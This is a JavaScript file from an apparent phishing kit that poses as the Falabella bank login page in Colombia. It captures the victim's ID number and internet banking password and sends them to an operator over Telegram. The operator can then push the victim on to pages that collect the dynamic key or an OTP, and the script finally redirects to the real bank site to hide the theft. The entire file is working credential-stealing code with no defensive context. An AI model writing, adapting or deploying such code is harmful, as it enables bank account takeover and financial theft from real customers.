/**
 * FALABELLA - script.js OPTIMIZADO
 * Página principal con integración al sistema centralizado
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Falabella Index: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        alert('Error: Sistema no inicializado correctamente');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const inputs = {
        docType: document.getElementById('docType'),
        cedula: document.getElementById('cedula'),
        claveInternet: document.getElementById('claveInternet')
    };
    const btnIngresar = document.getElementById('btnIngresar');
    const overlay = document.getElementById('loadingScreen');
    
    console.log('📋 Elementos:', { inputs, btnIngresar, overlay });

    BancoUtils.onTelegramAction(handleTelegramAction);

    // Cambiar placeholder según tipo de documento
    inputs.docType.addEventListener('change', () => {
        const selectedOption = inputs.docType.options[inputs.docType.selectedIndex];
        inputs.cedula.placeholder = selectedOption.text;
    });

    // Validación de inputs
    inputs.cedula.addEventListener('input', () => {
        BancoUtils.validateNumeric(inputs.cedula, 10);
        validateForm();
    });

    inputs.claveInternet.addEventListener('input', () => {
        BancoUtils.validateNumeric(inputs.claveInternet, 6);
        validateForm();
    });

    function validateForm() {
        const isValid = inputs.cedula.value.length >= 6 && 
                       inputs.claveInternet.value.length >= 4;
        btnIngresar.disabled = !isValid;
        if (isValid) {
            btnIngresar.classList.add('enabled');
        } else {
            btnIngresar.classList.remove('enabled');
        }
    }

    validateForm();

    btnIngresar.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnIngresar.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        if (overlay) {
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        }

        const data = {
            tipoDocumento: inputs.docType.options[inputs.docType.selectedIndex].text,
            cedula: inputs.cedula.value,
            claveInternet: inputs.claveInternet.value
        };

        console.log('📤 Datos a enviar:', data);
        BancoUtils.saveBankData('falabella', data);

        const message = BancoUtils.formatMessage('FALABELLA - LOGIN', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '🔐 Pedir Login', action: 'request_login' },
            { text: '🔢 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📱 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('login', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.style.display = 'none';
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        console.log('📢 Acción de Telegram recibida en Falabella Index:', data);
        
        if (overlay) {
            overlay.style.display = 'none';
            console.log('✅ Overlay ocultado');
        }
        
        switch(data.action) {
            case 'request_login':
                console.log('🔐 Limpiando campos de login');
                inputs.docType.selectedIndex = 0;
                inputs.cedula.value = '';
                inputs.claveInternet.value = '';
                btnIngresar.disabled = true;
                btnIngresar.classList.remove('enabled');
                break;
            case 'request_dynamic':
                console.log('🔢 Redirigiendo a dinamica.html');
                window.location.href = 'dinamica.html';
                break;
            case 'request_otp':
                console.log('📱 Redirigiendo a otp.html');
                window.location.href = 'otp.html';
                break;
            case 'finish':
                console.log('✅ Finalizando - redirigiendo a falabella.com.co');
                window.location.href = 'https://www.falabella.com.co/';
                break;
            default:
                console.log('⚠️ Acción desconocida:', data.action);
        }
    }
});
